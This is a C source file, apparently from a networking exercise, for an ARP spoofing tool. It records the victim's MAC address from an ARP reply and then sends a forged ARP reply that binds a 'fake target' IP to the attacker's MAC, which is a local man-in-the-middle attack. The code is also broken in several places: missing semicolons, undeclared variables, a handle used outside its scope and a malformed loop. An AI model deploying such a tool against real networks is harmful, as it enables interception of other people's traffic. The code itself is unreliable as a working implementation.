#include "send_arp.h"

int main(int argc, char *argv[]) {

	/*
	Different steps.
	1. get_ether_addr, get_ip_addr is the same
	2. get each of the sender-target list
	3. 
	*/

	//uint8_t* my_ether still.
	uint8_t my_ether[6]
	uint8_t my_ip[4];
	char errbuf[PCAP_ERRBUF_SIZE];

	// Will go to the function
	uint8_t sender_ether[6];

	//request packet.
	struct rq_packet rq_p;

	// only get once.
	char *dev;

	// have to be many.	uint8_t send_ip[4]; uint8_t target_ip[4];
	struct spoof_list *sp_list;

	// The same.( may be go to the funciton)

	uint8_t broadcast_ether[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	//step zero.
	if(argc<4) {
		//Should have syntax: send_arp <interface> <send ip> <target ip> <send ip2> <target ip2> ...
		usage(); 
		return -1;
	}
	printf("MY Interface : %s\n", argv[1]);
	// NOTICE.  sender recieves arp reply. 

	// Argc is bigger now.
	// argc cannot be even.
	for(int i = 2; i<argc-1; i=i+2) {
		printf("Sender(victim) IP : %s\n", argv[i]);
		printf("FAKE Target IP : %s\n", argv[i+1]);
	}

	sp_len = (argc-2)/2
	sp_list = (struct spoof_list *)malloc(sp_len * sizeof(struct spoof_list));

	//input each of them in to the list.
	for(int i = 0; i<sp_len; i=i+2) {
		inet_aton(argv[i+2], (in_addr *)sp_list[i].sender_ip_addr);
		inet_aton(argv[i+3], (in_addr *)sp_list[i].target_ip_addr);
	}


	// step zero.
	dev = argv[1];
	get_dev_ether_addr(my_ether, dev);
	print_ether(my_ether);
	get_dev_ip_addr(my_ip, dev);
	printf("my ip ");
	print_ip(my_ip);


	//1 send ARP request
	for(int i = 0, i<sp_len ; i++) {

		memcpy(rq_p.arp_p.dest_ip_addr, sp_list[i].sender_ip_addr, 4);
		memcpy(rq_p.arp_p.source_ip_addr, my_ip, 4);
		memcpy(rq_p.eth_header.ether_shost, my_ether, 6);
		memcpy(rq_p.eth_header.ether_dhost, broadcast_ether, 6);
		memcpy(rq_p.arp_p.source_ether_addr, my_ether, 6);
		memcpy(rq_p.arp_p.dest_ether_addr, broadcast_ether, 6);
		rq_arp(&rq_p); // make the rest of request packet
		//print request packet
		printf("---------------ethernet protocol--------------------\n");
		print_ether(rq_p.eth_header.ether_dhost);
		print_ether(rq_p.eth_header.ether_shost);
		printf("ether type : 0x%04x\n", htons(rq_p.eth_header.ether_type));

		printf("---------------arp protocol--------------------\n");
		printf("Hardware type : 0x%04x\n", htons(rq_p.arp_p.arp_hw));
		printf("Protocol type : 0x0%x\n", htons(rq_p.arp_p.arp_pro));
		printf("Hardware size : %d\n", rq_p.arp_p.arp_hlen);
		printf("Protocol size : %d\n", rq_p.arp_p.arp_plen);
		printf("Opcode : %d\n", rq_p.arp_p.arp_op);
		printf("Source ");
		print_ether(rq_p.arp_p.source_ether_addr);
		printf("Destination ");
		print_ether(rq_p.arp_p.dest_ether_addr);
		printf("Source ip ");
		print_ip(rq_p.arp_p.source_ip_addr);
		printf("Destination ip ");
		print_ip(rq_p.arp_p.dest_ip_addr);

		// send packet
		pcap_t* handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
		if(handle == NULL)  perror("handle null");
		int tmp;
		struct libnet_ethernet_hdr *tmp_eth;
		const uint8_t *get_packet;
		struct pcap_pkthdr *header;
		struct ARP_Header *tmp_arp;

		pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));
	}



	//2. recv ARP reply
	while(1) {
		tmp = pcap_next_ex(handle, &header, &get_packet);
		if(tmp<1) continue;
		tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
		if(ntohs(tmp_eth->ether_type) != 0X0806) continue;
		tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
		if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
			if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
				memcpy(sender_ether, tmp_arp->source_ether_addr, 6);
				break;
			}
		}
	}
	printf("Sender ethernet address :");
	print_ether(sender_ether);

	//3. send ARP reply
	struct rq_packet rp_p; //reply packet
	memcpy(rp_p.eth_header.ether_shost, my_ether, 6);
	memcpy(rp_p.eth_header.ether_dhost, sender_ether, 6);

	memcpy(rp_p.arp_p.dest_ip_addr, send_ip, 4);
	memcpy(rp_p.arp_p.source_ip_addr, target_ip, 4);

	memcpy(rp_p.arp_p.source_ether_addr, my_ether, 6);
	memcpy(rp_p.arp_p.dest_ether_addr, sender_ether, 6);
	rp_p.arp_p.arp_op = htons(2); //reply

	pcap_sendpacket(handle, (uint8_t *)&rp_p, sizeof(rp_p));

	return 0;
}
